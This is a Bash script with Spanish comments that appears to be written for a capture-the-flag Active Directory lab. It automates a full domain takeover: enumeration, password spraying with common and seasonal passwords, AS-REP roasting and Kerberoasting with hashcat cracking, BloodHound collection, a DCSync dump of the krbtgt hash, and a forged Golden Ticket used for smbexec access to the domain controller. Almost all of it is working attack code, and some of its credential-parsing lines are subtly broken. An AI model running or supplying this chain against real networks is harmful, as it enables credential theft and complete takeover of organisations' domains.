#!/bin/bash
# ============================================================
# 🏆 CTF-AD-AUTO-PWN.sh - Auto-Pwn del Dominio COMPLETO
# 
# Modo de uso:
#   chmod +x ctf-ad-auto-pwn.sh
#   sudo ./ctf-ad-auto-pwn.sh <DC_IP> <DOMINIO>
#
# Ejemplo:
#   sudo ./ctf-ad-auto-pwn.sh 172.31.254.146 lab.local
# ============================================================

# Colores
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; NC='\033[0m'
banner() { echo -e "${BLUE}============================================${NC}"; }
info()  { echo -e "${GREEN}[+]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
err()   { echo -e "${RED}[-]${NC} $1"; }
section() { echo; banner; echo -e "${YELLOW}  $1${NC}"; banner; }

# ===== CONFIGURACION =====
DC_IP="${1:-172.31.254.146}"
DOMAIN="${2:-lab.local}"
DOM="${DOMAIN%.LOCAL}"
KALI_IP=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
[ -z "$KALI_IP" ] && KALI_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)172\.31\.254\.\d+' | head -1)
START_TIME=$(date +%s)

# Directorios
mkdir -p ~/CTF/{recon,creds,bloodhound_data,loot,exploits,scripts}
cd ~/CTF || exit 1

section "🏁 CTF AD AUTO-PWN INICIADO"
info "DC_IP:    $DC_IP"
info "DOMAIN:   $DOMAIN"
info "KALI_IP:  $KALI_IP"
info "WORKDIR:  $(pwd)"

# ============================================================
# FASE 0: VERIFICAR CONECTIVIDAD
# ============================================================
section "FASE 0: VERIFICACION"
if ping -c 2 "$DC_IP" &>/dev/null; then
  info "Conectividad OK con $DC_IP"
else
  err "No hay conectividad con $DC_IP"
  exit 1
fi

# ============================================================
# FASE 1: RECONOCIMIENTO DEL DOMINIO
# ============================================================
section "FASE 1: RECONOCIMIENTO (50 pts)"

info "Escaneo de puertos en DC..."
nmap -sVC -p 53,88,135,139,389,445,636,3268,3389,5985 "$DC_IP" \
  -oN recon/nmap_dc.txt --open 2>/dev/null

info "Enumeracion con enum4linux-ng..."
enum4linux-ng -A "$DC_IP" -oA recon/enum4linux 2>/dev/null | tee -a recon/enum4linux_output.txt

info "Descubrimiento de DC via DNS..."
nslookup -type=SRV _ldap._tcp.dc._msdcs."$DOMAIN" "$DC_IP" 2>/dev/null | tee recon/dns_srv.txt

info "LDAP Root DSE..."
ldapsearch -x -H "ldap://$DC_IP" -b "DC=$DOM,DC=LOCAL" -s base 2>/dev/null | \
  grep -E "defaultNamingContext|domainControllerFunctionality|dnsHostName" | tee recon/ldap_base.txt

info "SMB shares..."
smbclient -L "//$DC_IP" -N 2>/dev/null | tee recon/smb_shares.txt
crackmapexec smb "$DC_IP" -u "" -p "" --shares 2>/dev/null | tee -a recon/smb_shares.txt

# ============================================================
# FASE 2: ENUMERACION DE USUARIOS
# ============================================================
section "FASE 2: ENUMERACION DE USUARIOS (50 pts)"

info "LDAP - Listando usuarios..."
ldapsearch -x -H "ldap://$DC_IP" -b "DC=$DOM,DC=LOCAL" \
  "(objectClass=user)" sAMAccountName 2>/dev/null | \
  grep "sAMAccountName:" | awk '{print $2}' | \
  grep -v '^$' | sort -u | tee recon/usuarios_completo.txt

info "Filtrando solo usuarios (no servicios)..."
grep -iv -E '\$' recon/usuarios_completo.txt > recon/usuarios.txt
USERS_COUNT=$(wc -l < recon/usuarios.txt)
info "Usuarios encontrados: $USERS_COUNT"

info "LDAP - Listando grupos..."
ldapsearch -x -H "ldap://$DC_IP" -b "DC=$DOM,DC=LOCAL" \
  "(objectClass=group)" name 2>/dev/null | \
  grep "^name:" | awk '{print $2}' | tee recon/grupos.txt

info "CrackMapExec - usuarios..."
crackmapexec smb "$DC_IP" -u "" -p "" --users 2>/dev/null | tee recon/cme_users.txt

info "Kerbrute - user enumeration..."
if command -v kerbrute &>/dev/null; then
  kerbrute userenum -d "$DOMAIN" --dc "$DC_IP" recon/usuarios.txt \
    -o recon/kerbrute_users.txt 2>/dev/null
fi

# ============================================================
# FASE 3: PASSWORDS EN DESCRIPTION
# ============================================================
section "FASE 3: PASSWORD EN DESCRIPTION (100 pts)"

info "Buscando passwords en atributo description..."
ldapsearch -x -H "ldap://$DC_IP" -b "DC=$DOM,DC=LOCAL" \
  "(description=*)" sAMAccountName description 2>/dev/null | \
  grep -B1 -i -E "pass|contrase|pwd|1234|admin|key|c0ntr" | \
  tee creds/passwords_in_description.txt

# Buscar cualquier description que tenga contenido sospechoso
ldapsearch -x -H "ldap://$DC_IP" -b "DC=$DOM,DC=LOCAL" \
  "(description=*)" sAMAccountName description 2>/dev/null > creds/todas_descripciones.txt
info "Description checks completado"

# ============================================================
# FASE 4: PASSWORDS POR DEFECTO / DEBILES
# ============================================================
section "FASE 4: PASSWORD POR DEFECTO (100 pts)"

info "Password spray con kerbrute..."
SEASONS=("Primavera2024" "Verano2024" "Otono2024" "Invierno2024" \
         "Spring2024" "Summer2024" "Fall2024" "Winter2024")
COMMON_PASS=("Password123!" "ChangeMe123!" "Admin123!" "P@ssw0rd" \
             "Welcome1" "Passw0rd!" "password" "123456" "admin")

for pass in "${COMMON_PASS[@]}"; do
  if command -v kerbrute &>/dev/null; then
    kerbrute passwordspray -d "$DOMAIN" --dc "$DC_IP" \
      recon/usuarios.txt "$pass" 2>/dev/null | \
      grep -i "VALID" >> creds/creds_encontradas.txt
  fi
done

# Password spray con crackmapexec
for pass in "${COMMON_PASS[@]}"; do
  crackmapexec smb "$DC_IP" -u recon/usuarios.txt -p "$pass" \
    --continue-on-success 2>/dev/null | \
    grep "[+]" >> creds/creds_encontradas.txt
done

# Probar usuario = password
while IFS= read -r user; do
  crackmapexec smb "$DC_IP" -u "$user" -p "$user" \
    --continue-on-success 2>/dev/null | \
    grep "[+]" >> creds/creds_user_is_pass.txt
done < recon/usuarios.txt

if [ -s creds/creds_encontradas.txt ]; then
  info "CREDENCIALES ENCONTRADAS!"
  cat creds/creds_encontradas.txt
else
  warn "No se encontraron credenciales debiles aun"
fi

# ============================================================
# FASE 5: AS-REP ROASTING
# ============================================================
section "FASE 5: AS-REP ROASTING (150 pts)"

info "AS-REP Roasting sin credenciales..."
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -no-pass \
  -usersfile recon/usuarios.txt 2>/dev/null | tee creds/asrep_hashes.txt

if [ -s creds/asrep_hashes.txt ]; then
  info "Hashes AS-REP obtenidos! Crackeando..."
  hashcat -m 18200 creds/asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
    --force -O -w 4 --outfile creds/asrep_cracked.txt 2>/dev/null
  [ -f creds/asrep_cracked.txt ] && info "AS-REP Cracked!" && cat creds/asrep_cracked.txt
else
  warn "No se encontraron usuarios AS-REP roastables"
fi

# ============================================================
# FASE 6: KERBEROASTING (si ya tenemos credenciales)
# ============================================================
section "FASE 6: KERBEROASTING (150 pts)"

# Buscar cualquier credencial encontrada
CRED_FILE=""
for f in creds/creds_encontradas.txt creds/creds_user_is_pass.txt creds/creds_from_description.txt; do
  [ -s "$f" ] && CRED_FILE="$f" && break
done

if [ -n "$CRED_FILE" ]; then
  # Extraer primer usuario:password valido
  FIRST_CRED=$(head -1 "$CRED_FILE")
  USER=$(echo "$FIRST_CRED" | grep -oP 'DOMINIO\.LOCAL\\\K\w+' || \
         grep -oP '\b\w+(?=:\d+)' <<< "$FIRST_CRED" | tail -1 || \
         echo "")
  PASS=$(echo "$FIRST_CRED" | grep -oP '\b\w+!\d*\b' head -1 || \
         grep -oP ':\K\S+' <<< "$FIRST_CRED" || echo "")

  # Si no se pudo extraer, usar primer user del archivo
  [ -z "$USER" ] && USER=$(head -1 recon/usuarios.txt)
  [ -z "$PASS" ] && PASS="Password123!"

  info "Usando credencial: $USER:$PASS"

  # Kerberoasting
  info "Kerberoasting..."
  impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC_IP" \
    -request -outputfile creds/kerberoast_hashes.txt 2>/dev/null

  if [ -s creds/kerberoast_hashes.txt ]; then
    info "Hashes Kerberoast obtenidos! Crackeando..."
    hashcat -m 13100 creds/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
      --force -O -w 4 --outfile creds/kerberoast_cracked.txt 2>/dev/null
    [ -f creds/kerberoast_cracked.txt ] && info "Kerberoast Cracked!" && cat creds/kerberoast_cracked.txt
  else
    warn "No se encontraron SPNs para kerberoasting"
  fi

  # LDAP domain dump
  info "LDAP Domain Dump..."
  ldapdomaindump "ldap://$DC_IP" -u "$DOMAIN\\$USER" -p "$PASS" \
    -o recon/ldap_dump/ 2>/dev/null

else
  warn "No hay credenciales disponibles para Kerberoasting aun"
  warn "Prueba manualmente cuando obtengas credenciales:"
  echo "  impacket-GetUserSPNs \"$DOMAIN/user:pass\" -dc-ip $DC_IP -request"
fi

# ============================================================
# FASE 7: BLOODHOUND (si tenemos credenciales)
# ============================================================
section "FASE 7: BLOODHOUND - ACL ABUSE (250 pts)"

if [ -n "$CRED_FILE" ] && [ -n "$USER" ] && [ -n "$PASS" ]; then
  info "Recolectando datos para BloodHound..."
  bloodhound-python -d "$DOMAIN" -u "$USER" -p "$PASS" \
    -dc "$DC_IP" -c All -ns "$DC_IP" \
    --zip -o bloodhound_data/ 2>/dev/null

  if ls bloodhound_data/*.zip 1>/dev/null 2>&1; then
    info "BloodHound data recolectada!"
    info "Para visualizar:"
    info "  1. sudo neo4j start"
    info "  2. bloodhound --no-sandbox &"
    info "  3. Arrastra el ZIP a BloodHound"
    info ""
    info "  QUERIES CLAVE:"
    info "  - Shortest Paths to Domain Admins from Owned Principals"
    info "  - Find Computers where Domain Users are Local Admin"
    info "  - Find Principals with DCSync Rights"
    info "  - Find all users with GenericAll permissions"
  fi
else
  warn "No hay credenciales para BloodHound"
fi

# ============================================================
# FASE 8: DCSync (si tenemos DA o permisos)
# ============================================================
section "FASE 8: DCSYNC - KRBTGT DUMP (300 pts)"

# Probar con Administrator:password comun
for pass in "${COMMON_PASS[@]}"; do
  result=$(impacket-secretsdump "$DOMAIN/Administrator:$pass"@"$DC_IP" \
    -just-dc-user krbtgt 2>/dev/null)
  if echo "$result" | grep -q "krbtgt"; then
    info "DCSync EXITOSO con Administrator:$pass!"
    echo "$result" | tee creds/krbtgt_hash.txt
    break
  fi
done

# Si tenemos credenciales, intentar con ellas
if [ -n "$USER" ] && [ -n "$PASS" ]; then
  result=$(impacket-secretsdump "$DOMAIN/$USER:$PASS"@"$DC_IP" \
    -just-dc-user krbtgt 2>/dev/null)
  if echo "$result" | grep -q "krbtgt"; then
    info "DCSync EXITOSO con $USER:$PASS!"
    echo "$result" | tee creds/krbtgt_hash.txt
  fi
fi

# Guardar SID del dominio
if [ -f recon/ldap_base.txt ]; then
  grep -oP 'S-1-5-21-\d+-\d+-\d+' recon/ldap_base.txt > creds/domain_sid.txt 2>/dev/null
  impacket-lookupsid "$DOMAIN/$USER:$PASS"@"$DC_IP" 2>/dev/null | \
    grep "DOMAIN.*SID" | head -1 >> creds/domain_sid.txt 2>/dev/null
elif [ -n "$USER" ] && [ -n "$PASS" ]; then
  impacket-lookupsid "$DOMAIN/$USER:$PASS"@"$DC_IP" 2>/dev/null | \
    grep "Domain SID" | head -1 >> creds/domain_sid.txt 2>/dev/null
fi

# ============================================================
# FASE 9: GOLDEN TICKET (si tenemos krbtgt hash)
# ============================================================
section "FASE 9: GOLDEN TICKET (400 pts - BONUS)"

if [ -f creds/krbtgt_hash.txt ] && [ -s creds/krbtgt_hash.txt ]; then
  info "Creando Golden Ticket..."

  # Extraer hash NTLM del krbtgt
  KRBTGT_NTLM=$(grep -oP '(?<=:)[a-f0-9]{32}' creds/krbtgt_hash.txt | head -1 || \
                awk -F: '{print $NF}' creds/krbtgt_hash.txt | head -1)
  DOMAIN_SID=$(cat creds/domain_sid.txt 2>/dev/null | grep -oP 'S-1-5-21-\d+-\d+-\d+' | head -1)

  if [ -n "$KRBTGT_NTLM" ] && [ -n "$DOMAIN_SID" ]; then
    info "KRBTGT NTLM: $KRBTGT_NTLM"
    info "DOMAIN SID:  $DOMAIN_SID"

    impacket-ticketer -nthash "$KRBTGT_NTLM" \
      -domain-sid "$DOMAIN_SID" \
      -domain "$DOMAIN" \
      -dc "$DC_IP" \
      administrator 2>/dev/null

    if [ -f administrator.ccache ]; then
      info "✅ GOLDEN TICKET CREADO: administrator.ccache"
      export KRB5CCNAME=$(pwd)/administrator.ccache

      info "Probando acceso al DC..."
      impacket-smbexec "$DOMAIN/administrator"@"$DC_IP" -k -no-pass \
        -nooutput 2>/dev/null && \
        info "✅ ACCESO TOTAL AL DOMINIO!" || \
        warn "Golden Ticket creado pero no se pudo conectar"
    fi
  else
    warn "Faltan datos para Golden Ticket (NTLM o SID)"
  fi
else
  warn "No se obtuvo hash de krbtgt aun"
fi

# ============================================================
# RESUMEN FINAL
# ============================================================
section "📊 RESUMEN FINAL"
END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

echo -e "${GREEN}Tiempo total:${NC} $(date -ud @$DURATION '+%H:%M:%S')"
echo ""
echo -e "${BLUE}Archivos generados:${NC}"
echo "  📁 recon/   - Informacion del dominio"
echo "  📁 creds/   - Credenciales y hashes"
echo "  📁 bloodhound_data/ - Datos para BloodHound"
echo "  📁 loot/    - Flags capturadas"
echo ""
echo -e "${BLUE}Flags encontradas:${NC}"
for f in creds/*.txt; do
  [ -f "$f" ] && [ -s "$f" ] && echo "  🏁 $(basename "$f")" || true
done
echo ""
echo -e "${BLUE}Proximos pasos:${NC}"
if [ -f administrator.ccache ]; then
  echo "  ✅ Golden Ticket listo! Ya tienes control total"
else
  echo "  ⏳ Revisa manualmente los archivos en creds/"
  echo "  ⏳ BloodHound: sudo neo4j start && bloodhound --no-sandbox &"
fi
echo ""
banner
echo -e "${GREEN}  🏆 CTF COMPLETADO - BUENA SUERTE ITMAR! ${NC}"
banner
